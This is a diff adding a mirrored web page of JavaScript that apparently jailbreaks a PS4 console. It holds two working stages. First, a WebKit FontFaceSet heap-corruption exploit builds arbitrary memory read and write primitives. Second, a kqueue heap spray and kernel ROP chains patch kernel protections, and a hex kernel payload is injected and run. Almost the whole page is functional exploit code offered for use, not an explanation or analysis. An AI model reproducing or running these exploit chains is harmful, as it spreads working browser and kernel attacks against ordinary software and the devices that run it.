+  SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
+  KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
+  p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));
+  kchain = new rop();
+  kchain2 = new rop(); {
+   chain.fcall(window.syscalls[203], kchain.stackback, 0x40000);
+   chain.fcall(window.syscalls[203], kchain2.stackback, 0x40000);
+   chain.fcall(window.syscalls[203], SAVED_KERNEL_STACK_PTR, 0x10);
+  }
+  chain.run();
+  kchain.count = 0;
+  kchain2.count = 0;
+  kchain.set_kernel_var(KERNEL_BASE_PTR);
+  kchain2.set_kernel_var(KERNEL_BASE_PTR);
+  kchain.push(gadgets["pop rax"]);
+  kchain.push(SAVED_KERNEL_STACK_PTR);
+  kchain.push(gadgets["mov [rax], rdi"]);
+  kchain.push(gadgets["pop r8"]);
+  kchain.push(KERNEL_BASE_PTR);
+  kchain.push(gadgets["add [r8], r12"]);
+  kchain.kwrite1(KERNEL_busy, 0x1);
+  kchain.push(gadgets["sti"]);
+  var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
+  var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
+  kchain.push(gadgets["pop rdi"]);
+  kchain.push(0x6);
+  kchain.push(gadgets["pop rsi"]);
+  kchain.push(gadgets["mov rsp, rdi"]);
+  kchain.push(gadgets["pop rdx"]);
+  kchain.push(0xE);
+  kchain.push(gadgets["pop rcx"]);
+  kchain.push(0x0);
+  kchain.push(gadgets["pop r8"]);
+  kchain.push(0x0);
+  var idx1_dest = kchain.get_rsp();
+  kchain.pushSymbolic();
+  kchain.push(gadgets["pop rsi"]);
+  kchain.push(0x80040033);
+  kchain.push(gadgets["pop rdi"]);
+  kchain.push(kchain2.stack);
+  var idx2_dest = kchain.get_rsp();
+  kchain.pushSymbolic();
+  kchain.finalizeSymbolic(idx1, idx1_dest);
+  kchain.finalizeSymbolic(idx2, idx2_dest);
+  kchain2.kwrite2(KERNEL_veriPatch, 0x9090);
+  kchain2.kwrite1(KERNEL_bcopy, 0xEB);
+  kchain2.kwrite1(KERNEL_bzero, 0xEB);
+  kchain2.kwrite1(KERNEL_pagezero, 0xEB);
+  kchain2.kwrite1(KERNEL_memcpy, 0xEB);
+  kchain2.kwrite1(KERNEL_pagecopy, 0xEB);
+  kchain2.kwrite1(KERNEL_copyin, 0xEB);
+  kchain2.kwrite1(KERNEL_copyinstr, 0xEB);
+  kchain2.kwrite1(KERNEL_copystr, 0xEB);
+  kchain2.kwrite1(KERNEL_busy, 0x0);
+  var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
+  var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
+  kchain2.push(gadgets["pop rdi"]);
+  kchain2.push(0x6);
+  kchain2.push(gadgets["pop rsi"]);
+  var idx3_dest = kchain2.get_rsp();
+  kchain2.pushSymbolic();
+  kchain2.push(gadgets["pop rdx"]);
+  kchain2.push(0xE);
+  kchain2.push(gadgets["pop rcx"]);
+  kchain2.push(0x0);
+  kchain2.push(gadgets["pop r8"]);
+  kchain2.push(0x0);
+  var idx4_dest = kchain2.get_rsp();
+  kchain2.pushSymbolic();
+  kchain2.finalizeSymbolic(idx3, idx3_dest);
+  kchain2.finalizeSymbolic(idx4, idx4_dest);
+  kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
+  kchain2.kwrite1(KERNEL_enable_syscalls_4, 0xEB);
+  kchain2.kwrite2(KERNEL_enable_syscalls_3, 0x9090);
+  kchain2.kwrite2(KERNEL_enable_syscalls_2, 0x9090);
+  kchain2.kwrite1(KERNEL_setuid, 0xEB);
+  kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
+  kchain2.kwrite2(KERNEL_prx, 0xE990);
+  kchain2.kwrite1(KERNEL_dlsym_1, 0xEB);
+  kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);
+  kchain2.kwrite1(KERNEL_mmap_1, 0x37);
+  kchain2.kwrite1(KERNEL_mmap_2, 0x37);
+  kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
+  kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
+  kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);
+  kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
+  var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
+  kchain2.push(gadgets["pop rdi"]);
+  kchain2.push(0x80050033);
+  var idx5_dest = kchain2.get_rsp();
+  kchain2.pushSymbolic();
+  kchain2.finalizeSymbolic(idx5, idx5_dest);
+  kchain2.rax_kernel(KERNEL_kqueue_close_epi);
+  kchain2.push(gadgets["mov rdx, rax"]);
+  kchain2.push(gadgets["pop rsi"]);
+  kchain2.push(SAVED_KERNEL_STACK_PTR);
+  kchain2.push(gadgets["mov rax, [rsi]"]);
+  kchain2.push(gadgets["pop rcx"]);
+  kchain2.push(0x10);
+  kchain2.push(gadgets["add rax, rcx"]);
+  kchain2.push(gadgets["mov [rax], rdx"]);
+  kchain2.push(gadgets["pop rdi"]);
+  var idx6 = kchain2.pushSymbolic();
+  kchain2.push(gadgets["mov [rdi], rax"]);
+  kchain2.push(gadgets["sti"]);
+  kchain2.push(gadgets["pop rsp"]);
+  var idx6_dest = kchain2.get_rsp();
+  kchain2.pushSymbolic();
+  kchain2.finalizeSymbolic(idx6, idx6_dest);
+ }
+ 
+ function object_setup() {
+  var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1010, 0xFFFFFFFF, 0x0);
+  var fake_filtops = fake_knote.add32(0x4000);
+  var fake_obj = fake_knote.add32(0x8000);
+  if (fake_knote.low != 0x4000) {
+   alert("enomem: " + fake_knote);
+   while (1);
+  } {
+   p.write8(fake_knote, fake_obj);
+   p.write8(fake_knote.add32(0x68), fake_filtops);
+  } {
+   p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]);
+   p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]);
+   p.write8(fake_filtops.add32(0x8), kchain.stack);
+   p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]);
+  } {
+   p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]);
+  }
+  chain.syscall(203, fake_knote, 0xC000);
+ }
+ 
+ var trigger_spray = function () {
+  var NUM_KQUEUES = 0x1B0;
+  var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4); {
+   for (var i = 0; i < NUM_KQUEUES; i++) {
+    chain.fcall(window.syscalls[362]);
+    chain.write_result4(kqueue_ptr.add32(0x4 * i));
+   }
+  }
+  chain.run();
+  var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);
+  var that_one_socket = chain.syscall(97, 2, 1, 0);
+  if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
+   alert("invalid socket");
+   while (1);
+  }
+  var kevent = p.malloc(0x20);
+  p.write8(kevent.add32(0x0), that_one_socket);
+  p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
+  p.write4(kevent.add32(0xC), 0x0);
+  p.write8(kevent.add32(0x10), 0x0);
+  p.write8(kevent.add32(0x18), 0x0); {
+   for (var i = 0; i < NUM_KQUEUES; i++) {
+    chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
+   }
+  }
+  chain.run(); {
+   for (var i = 18; i < NUM_KQUEUES; i += 2) {
+    chain.fcall(window.syscalls[6], kqueues[i]);
+   }
+  }
+  chain.run(); 
+  enableUSB();
+    sleep(10000).then(() => {
+  {
+   for (var i = 1; i < NUM_KQUEUES; i += 2) {
+    chain.fcall(window.syscalls[6], kqueues[i]);
+   }
+  }
+  chain.run();
+  if (chain.syscall(23, 0).low == 0) {
+			
+            chain.fcall(window.syscalls[73], 0x4000, 0xC000);
+            chain.fcall(window.syscalls[325]);
+            chain.run();
+
+            var patch_buffer = chain.syscall(477, 0x0, 0x4000, 0x7, 0x1000, 0xFFFFFFFF, 0);
+            var patch_buffer_view = p.array_from_address(patch_buffer, 0x1000);
+            var PatchPl = [0x00000BB8,0xFE894800,0x033D8D48,0x0F000000,0x4855C305,0x8B48E589,0x95E8087E,0xE8000000,0x00000175,0x033615FF,0x8B480000,0x0003373D,0x3F8B4800,0x74FF8548,0x3D8D48EB,0x0000029D,0xF9358B48,0x48000002,0x0322158B,0x8B480000,0x00D6E812,0x8D480000,0x00029F3D,0x358B4800,0x000002E4,0x05158B48,0x48000003,0xB9E8128B,0x48000000,0x02633D8D,0x8B480000,0x0002BF35,0x158B4800,0x000002C8,0xE8128B48,0x0000009C,0x7A3D8D48,0x48000002,0x02AA358B,0x8B480000,0x0002AB15,0x128B4800,0x00007FE8,0x0185E800,0xC35D0000,0x6D3D8948,0x48000002,0x026E3D01,0x01480000,0x00026F3D,0x3D014800,0x00000270,0x713D0148,0x48000002,0x02723D01,0x01480000,0x0002933D,0x3D014800,0x00000294,0x653D0148,0x48000002,0x02663D01,0x01480000,0x0002873D,0x3D014800,0x00000288,0x893D0148,0x48000002,0x028A3D01,0x01480000,0x00028B3D,0x3D014800,0x0000024C,0x3D3D0148,0xC3000002,0xE5894855,0x10EC8348,0x24348948,0x24548948,0xED15FF08,0x48000001,0x4B74C085,0x48C28948,0x4840408B,0x2F74C085,0x28788B48,0x243C3B48,0x8B480A74,0xC0854800,0xECEB1D74,0x18788B48,0x74FF8548,0x7F8B48ED,0x7C3B4810,0xE2750824,0xFF1040C7,0x48FFFFFF,0x31107A8D,0x31D231F6,0xA515FFC9,0x48000001,0x5D10C483,0x894855C3,0xC0200FE5,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000001C8,0x909007C7,0x47C79090,0x48909004,0x358B48B8,0x000001AC,0x08778948,0x651047C7,0xC73C8B48,0x00251447,0x47C70000,0x89480018,0x1C47C738,0xB8489090,0x7D358B48,0x48000001,0xC7207789,0xC7482847,0x47C70100,0x0000002C,0x778D48E9,0x158B4834,0x00000150,0x89F22948,0x8B483057,0x00016B35,0x568D4800,0xD7294805,0xC148FF89,0x814808E7,0x0000E9CF,0x3E894800,0x00000D48,0x220F0001,0x55C35DC0,0x0FE58948,0x2548C020,0xFFFEFFFF,0x48C0220F,0x013A3D8B,0x07C70000,0x00C3C031,0x353D8B48,0xC7000001,0xC3C03107,0x3D8B4800,0x00000130,0xC03107C7,0x8B4800C3,0x00012B3D,0x3107C700,0x4800C3C0,0x00A63D8B,0x87C70000,0x001F1E01,0x9090F631,0x1E0587C7,0xC931001F,0x87C79090,0x001F1E09,0x9090D231,0x1E3E87C7,0xC931001F,0x0D489090,0x00010000,0xFFC0220F,0x0000EF15,0xC0200F00,0xFFFF2548,0x220FFFFE,0x3D8B48C0,0x000000DC,0xC03107C7,0x0D4800C3,0x00010000,0x5DC0220F,0x737973C3,0x5F6D6574,0x70737573,0x5F646E65,0x73616870,0x705F3265,0x735F6572,0x00636E79,0x74737973,0x725F6D65,0x6D757365,0x68705F65,0x32657361,0x73797300,0x5F6D6574,0x75736572,0x705F656D,0x65736168,0x90900033,0x00000000,0x00000000,0x000F88F0,0x00000000,0x002EF170,0x00000000,0x00018DF0,0x00000000,0x00018EF0,0x00000000,0x02654110,0x00000000,0x00097230,0x00000000,0x00402E60,0x00000000,0x01520108,0x00000000,0x01520100,0x00000000,0x00462D20,0x00000000,0x00462DFC,0x00000000,0x006259A0,0x00000000,0x006268D0,0x00000000,0x00625DC0,0x00000000,0x00626290,0x00000000,0x00626720,0x00000000];
+            for(var i=0; i < PatchPl.length; i++)
+            {
+              patch_buffer_view[i] = PatchPl[i];
+            }
+            chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
+            chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
+            chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
+            chain.run();
+            setTimeout(jbdone, 3000);
+			disableUSB();
+        }
+        else
+        {
+		    disableUSB();
+            alert("failed to trigger exploit kernel heap might be corrupted, try again or reboot the console");
+            p.write8(0, 0);
+        }
+		});
+};
+ 
+ function kernelX() {
+  extra_gadgets();
+  kchain_setup();
+  object_setup();
+  trigger_spray();
+ }
+ 
+ kernelX();
+}
+function start() {
+progress.innerHTML="PS4Xploit - Jailbreaking...";
+setTimeout(poc,50);
+}
+	
+function poc() {
+ var PAGE_SIZE = 16384;
+ var SIZEOF_CSS_FONT_FACE = 0xb8;
+ var HASHMAP_BUCKET = 208;
+ var STRING_OFFSET = 20;
+ var SPRAY_FONTS = 0x100a;
+ var GUESS_FONT = 0x200430000;
+ var NPAGES = 20;
+ var INVALID_POINTER = 0;
+ var HAMMER_FONT_NAME = "font8";
+ var HAMMER_NSTRINGS = 700;
+ var union = new ArrayBuffer(8);
+ var union_b = new Uint8Array(union);
+ var union_i = new Uint32Array(union);
+ var union_f = new Float64Array(union);
+ var bad_fonts = [];
+ for (var i = 0; i < SPRAY_FONTS; i++)
+  bad_fonts.push(new FontFace("font1", "", {}));
+ var good_font = new FontFace("font2", "url(data:text/html,)", {});
+ bad_fonts.push(good_font);
+ var arrays = [];
+ for (var i = 0; i < 512; i++)
+  arrays.push(new Array(31));
+ arrays[256][0] = 1.5;
+ arrays[257][0] = {};
+ arrays[258][0] = 1.5;
+ var jsvalue = {
+  a: arrays[256],
+  b: new Uint32Array(1),
+  c: true
+ };
+ var string_atomifier = {};
+ var string_id = 10000000;
+ function ptrToString(p) {
+  var s = '';
+  for (var i = 0; i < 8; i++) {
+   s += String.fromCharCode(p % 256);
+   p = (p - p % 256) / 256;
+  }
+  return s;
+ }
+ function stringToPtr(p, o) {
+  if (o === undefined)
+   o = 0;
+  var ans = 0;
+  for (var i = 7; i >= 0; i--)
+   ans = 256 * ans + p.charCodeAt(o + i);
+  return ans;
+ }
+ var strings = [];
+ function mkString(l, head) {
+  var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
+  string_atomifier[s] = 1;
+  strings.push(s);
+  return s;
+ }
+ var guf = GUESS_FONT;
+ var ite = true;
+ var matches = 0;
+ var round = 0;
+ window.ffses = {};
+ do {
+  var p_s = ptrToString(NPAGES + 2);
+  for (var i = 0; i < NPAGES; i++)
+   p_s += ptrToString(guf + i * PAGE_SIZE);
+  p_s += ptrToString(INVALID_POINTER);
+  for (var i = 0; i < 256; i++)
+   mkString(HASHMAP_BUCKET, p_s);
+  var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
+  var badstr1 = mkString(HASHMAP_BUCKET, p_s);
+  var guessed_font = null;
+  var guessed_addr = null;
+  for (var i = 0; i < SPRAY_FONTS; i++) {
+   bad_fonts[i].family = "search" + round;
+   if (badstr1.substr(0, p_s.length) != p_s) {
+    guessed_font = i;
+    var p_s1 = badstr1.substr(0, p_s.length);
+    for (var i = 1; i <= NPAGES; i++) {
+     if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
+      guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
+      break;
+     }
+    }
+    if (matches++ == 0) {
+     guf = guessed_addr + 2 * PAGE_SIZE;
+     guessed_addr = null;
+    }
+    break;
+   }
+  }
+  if ((ite = !ite))
+   guf += NPAGES * PAGE_SIZE;
+ } while (guessed_addr === null);
+ var p_s = '';
+ p_s += ptrToString(26);
+ p_s += ptrToString(guessed_addr);
+ p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+ for (var i = 0; i < 19; i++)
+  p_s += ptrToString(INVALID_POINTER);
+ for (var i = 0; i < 256; i++)
+  mkString(HASHMAP_BUCKET, p_s);
+ var needfix = [];
+ for (var i = 0; ; i++) {
+  ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
+  var badstr2 = mkString(HASHMAP_BUCKET, p_s);
+  needfix.push(mkString(HASHMAP_BUCKET, p_s));
+  bad_fonts[guessed_font].family = "evil2";
+  bad_fonts[guessed_font + 1].family = "evil3";
+  var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
+  if (leak < 0x1000000000000)
+   break;
+ }
+ function makeReader(read_addr, ffs_name) {
+  var fake_s = '';
+  fake_s += '0000';
+  fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff';
+  fake_s += ptrToString(read_addr);
+  fake_s += ptrToString(0x80000014);
+  p_s = '';
+  p_s += ptrToString(29);
+  p_s += ptrToString(guessed_addr);
+  p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
+  p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
+  for (var i = 0; i < 18; i++)
+   p_s += ptrToString(INVALID_POINTER);
+  for (var i = 0; i < 256; i++)
+   mkString(HASHMAP_BUCKET, p_s);
+  var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
+  mkString(HASHMAP_BUCKET, p_s);
+  var relative_read = mkString(HASHMAP_BUCKET, fake_s);
+  bad_fonts[guessed_font].family = ffs_name + "_evil1";
+  bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
+  bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
+  needfix.push(relative_read);
+  if (relative_read.length < 1000)
+   return makeReader(read_addr, ffs_name + '_');
+  return relative_read;
+ }
+ var fastmalloc = makeReader(leak, 'ffs3');
+ for (var i = 0; i < 100000; i++)
+  mkString(128, '');
+ var props = [];
+ for (var i = 0; i < 0x10000; i++) {
+  props.push({
+   value: 0x41434442
+  });
+  props.push({
+   value: jsvalue
+  });
+ }
+ var jsvalue_leak = null;
+ while (jsvalue_leak === null) {
+  Object.defineProperties({}, props);
+  for (var i = 0; ; i++) {
+   if (fastmalloc.charCodeAt(i) == 0x42 && fastmalloc.charCodeAt(i + 1) == 0x44 && fastmalloc.charCodeAt(i + 2) == 0x43 && fastmalloc.charCodeAt(i + 3) == 0x41 && fastmalloc.charCodeAt(i + 4) == 0 && fastmalloc.charCodeAt(i + 5) == 0 && fastmalloc.charCodeAt(i + 6) == 254 && fastmalloc.charCodeAt(i + 7) == 255 && fastmalloc.charCodeAt(i + 24) == 14) {
+    jsvalue_leak = stringToPtr(fastmalloc, i + 32);
+    break;
+   }
+  }
+ }
+ var rd_leak = makeReader(jsvalue_leak, 'ffs4');
+ var array256 = stringToPtr(rd_leak, 16);
+ var ui32a = stringToPtr(rd_leak, 24);
+ var rd_arr = makeReader(array256, 'ffs5');
+ var butterfly = stringToPtr(rd_arr, 8);
+ var rd_ui32 = makeReader(ui32a, 'ffs6');
+ for (var i = 0; i < 8; i++)
+  union_b[i] = rd_ui32.charCodeAt(i);
+ var structureid_low = union_i[0];
+ var structureid_high = union_i[1];
+ union_i[0] = 0x10000;
+ union_i[1] = 0;
+ arrays[257][1] = {};
+ arrays[257][0] = union_f[0];
+ union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
+ union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
+ arrays[256][i] = union_f[0];
+ pp_s = '';
+ pp_s += ptrToString(56);
+ for (var i = 0; i < 12; i++)
+  pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);
+ var fake_s = '';
+ fake_s += '0000';
+ fake_s += ptrToString(INVALID_POINTER);
+ fake_s += ptrToString(butterfly);
+ fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';
+ var ffs7_args = [];
+ for (var i = 0; i < 12; i++)
+  ffs7_args.push(bad_fonts[guessed_font + i]);
+ ffs7_args.push(good_font);
+ var ffs8_args = [bad_fonts[guessed_font + 12]];
+ for (var i = 0; i < 5; i++)
+  ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
+ for (var i = 0; i < HAMMER_NSTRINGS; i++)
+  mkString(HASHMAP_BUCKET, pp_s);
+ ffses.ffs7 = new FontFaceSet(ffs7_args);
+ mkString(HASHMAP_BUCKET, pp_s);
+ ffses.ffs8 = new FontFaceSet(ffs8_args);
+ var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
+ needfix.push(post_ffs);
+ for (var i = 0; i < 13; i++)
+  bad_fonts[guessed_font + i].family = "hammer" + i;
+ function boot_addrof(obj) {
+  arrays[257][32] = obj;
+  union_f[0] = arrays[258][0];
+  return union_i[1] * 0x100000000 + union_i[0];
+ }
+ function boot_fakeobj(addr) {
+  union_i[0] = addr;
+  union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
+  arrays[258][0] = union_f[0];
+  return arrays[257][32];
+ }
+ var arw_master = new Uint32Array(8);
+ var arw_slave = new Uint8Array(1);
+ var obj_master = new Uint32Array(8);
+ var obj_slave = {
+  obj: null
+ };
+ var addrof_slave = boot_addrof(arw_slave);
+ var addrof_obj_slave = boot_addrof(obj_slave);
+ union_i[0] = structureid_low;
+ union_i[1] = structureid_high;
+ union_b[6] = 7;
+ var obj = {
+  jscell: union_f[0],
+  butterfly: true,
+  buffer: arw_master,
+  size: 0x5678
+ };
+ function i48_put(x, a) {
+  a[4] = x | 0;
+  a[5] = (x / 4294967296) | 0;
+ }
+ function i48_get(a) {
+  return a[4] + a[5] * 4294967296;
+ }
+ window.addrof = function (x) {
+  obj_slave.obj = x;
+  return i48_get(obj_master);
+ };
+ window.fakeobj = function (x) {
+  i48_put(x, obj_master);
+  return obj_slave.obj;
+ };
+ function read_mem_setup(p, sz) {
+  i48_put(p, arw_master);
+  arw_master[6] = sz;
+ }
+ window.read_mem = function (p, sz) {
+  read_mem_setup(p, sz);
+  var arr = [];
+  for (var i = 0; i < sz; i++)
+   arr.push(arw_slave[i]);
+  return arr;
+ };
+ window.write_mem = function (p, data) {
+  read_mem_setup(p, data.length);
+  for (var i = 0; i < data.length; i++)
+   arw_slave[i] = data[i];
+ };
+ window.read_ptr_at = function (p) {
+  var ans = 0;
+  var d = read_mem(p, 8);
+  for (var i = 7; i >= 0; i--)
+   ans = 256 * ans + d[i];
+  return ans;
+ };
+ window.write_ptr_at = function (p, d) {
+  var arr = [];
+  for (var i = 0; i < 8; i++) {
+   arr.push(d & 0xff);
+   d /= 256;
+  }
+  write_mem(p, arr);
+ };
+ (function () {
+  var magic = boot_fakeobj(boot_addrof(obj) + 16);
+  magic[4] = addrof_slave;
+  magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
+  obj.buffer = obj_master;
+  magic[4] = addrof_obj_slave;
+  magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
+  magic = null;
+ })();
+ (function () {
+  var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
+  write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
+  for (var i = 0; i < needfix.length; i++) {
+   var addr = read_ptr_at(addrof(needfix[i]) + 8);
+   write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
+   write_ptr_at(addr + 8, addr + 20);
+   write_ptr_at(addr + 16, 0x80000014);
+  }
+  write_ptr_at(butterfly + 248, 0x1f0000001f);
+ })();
+ var expl_master = new Uint32Array(8);
+ var expl_slave = new Uint32Array(2);
+ var addrof_expl_slave = addrof(expl_slave);
+ var m = fakeobj(addrof(obj) + 16);
+ obj.buffer = expl_slave;
+ m[7] = 1;
+ obj.buffer = expl_master;
+ m[4] = addrof_expl_slave;
+ m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
+ m[7] = 1;
+ var prim = {
+  write8: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   if (value instanceof int64) {
+    expl_slave[0] = value.low;
+    expl_slave[1] = value.hi;
+   } else {
+    expl_slave[0] = value;
+    expl_slave[1] = 0;
+   }
+  },
+  write4: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   if (value instanceof int64) {
+    expl_slave[0] = value.low;
+   } else {
+    expl_slave[0] = value;
+   }
+  },
+  write2: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   var tmp = expl_slave[0] & 0xFFFF0000;
+   if (value instanceof int64) {
+    expl_slave[0] = ((value.low & 0xFFFF) | tmp);
+   } else {
+    expl_slave[0] = ((value & 0xFFFF) | tmp);
+   }
+  },
+  write1: function (addr, value) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   var tmp = expl_slave[0] & 0xFFFFFF00;
+   if (value instanceof int64) {
+    expl_slave[0] = ((value.low & 0xFF) | tmp);
+   } else {
+    expl_slave[0] = ((value & 0xFF) | tmp);
+   }
+  },
+  read8: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return new int64(expl_slave[0], expl_slave[1]);
+  },
+  read4: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return expl_slave[0];
+  },
+  read2: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return expl_slave[0] & 0xFFFF;
+  },
+  read1: function (addr) {
+   expl_master[4] = addr.low;
+   expl_master[5] = addr.hi;
+   return expl_slave[0] & 0xFF;
+  },
+  leakval: function (obj) {
+   obj_slave.obj = obj;
+   return new int64(obj_master[4], obj_master[5]);
+  }
+ };
+ window.p = prim;
+ progress.innerHTML="PS4Xploit - Running ExHax...";
+ run_hax();
+}
+
+</script>
+    </body>
+
+<!-- Mirrored from 10.1.1.1/Hakkuraifu.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 13 Nov 2022 17:25:09 GMT -->
+</html>
